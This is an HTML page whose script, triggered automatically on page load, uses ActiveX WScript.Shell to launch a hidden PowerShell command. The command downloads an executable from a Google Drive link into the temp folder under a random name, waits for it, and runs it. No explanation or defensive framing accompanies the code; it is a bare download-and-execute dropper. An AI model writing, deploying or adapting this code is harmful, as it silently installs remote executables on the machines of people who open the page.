<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Download and Execute File</title>
    <script type="text/javascript">
        function downloadAndRun() {
            var objShell = new ActiveXObject("WScript.Shell");

            // Define temp folder and download URL
            var tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%");
            var downloadUrl = "https://drive.google.com/uc?export=download&id=1pjn7VlGpYkvUd44Q6toYv712IgZZtx8H"; // Replace with actual URL
            var randomFileName = "downloaded" + Math.floor(Math.random() * 1000) + ".exe";
            var downloadedFile = tempFolder + "\\" + randomFileName;

            // PowerShell command to download file
            var cmdCommand = 'powershell.exe -Command "Invoke-WebRequest -Uri ' + downloadUrl + ' -OutFile ' + downloadedFile + '"';

            // Run the command
            objShell.Run("cmd.exe /c " + cmdCommand, 0, true);

            // Wait for the file to be downloaded and then run it
            var fso = new ActiveXObject("Scripting.FileSystemObject");
            while (!fso.FileExists(downloadedFile)) {
                WScript.Sleep(1000); // Wait for the file to be downloaded
            }
            objShell.Run(downloadedFile);
        }
    </script>
</head>
<body onload="downloadAndRun();">
    <h1>Downloading and Running File</h1>
</body>
</html>
